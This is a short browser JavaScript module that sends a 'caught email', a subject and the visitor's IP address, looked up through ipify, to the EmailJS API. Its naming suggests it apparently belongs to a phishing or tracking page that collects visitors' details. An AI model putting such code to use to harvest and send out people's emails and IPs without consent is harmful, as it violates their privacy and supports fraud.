(function (global)
{
   let sender = {};
   let ip = null;
   /**
    * Submits email to EmailJS with given subject and email and also finds and sends the ip address
    *
    * @param {string} email Caught email to send
    * @param {string} subject Subject to use on email
    */
   async function submitEmail(email, subject)
   {
      if (ip == null)
         ip = await getIp();
      let properties = await getProperties();
      let url = "https://api.emailjs.com/api/v1.0/email/send";
      const API_KEY = properties["api-key"];
      const TEMPLATE_ID = properties["template-id"];
      const SERVICE_ID = properties["service-id"];
      let request = new Request(url, {
         method: "POST",
         headers: {
            "Content-Type": "application/json"
         },
         body: JSON.stringify({
            service_id: SERVICE_ID,
            template_id: TEMPLATE_ID,
            user_id: API_KEY,
            template_params: {
               subject: subject,
               caught_email: email,
               ip_address: ip
            }
         })
      });
      let response = await fetch(request);
      console.log("Sent");
   }
   /**
    * @abstract Sends email to EmailJS with given subject and ip address
    * 
    * @param {string} subject Subject to use on email
    */
   async function sendIp(subject)
   {
      submitEmail(null,subject);
   }
   /**
    * @abstract Finds users ip address
    */
   async function getIp()
   {
      let response = await fetch('https://api.ipify.org?format=json');
      let data = await response.json();
      return data['ip'];
   }
   /**
    * @abstract Fetches EmailJS properties
    * 
    * @returns {Promise<Object>} Object containing the properties
    */
   async function getProperties()
   {
      let response = await fetch(`../api-properties.json`);
      let data = await response.json();
      return data;
   }
   sender.sendEmail = submitEmail;
   sender.sendIp = sendIp;
   global.$emailSender = sender;
})(window);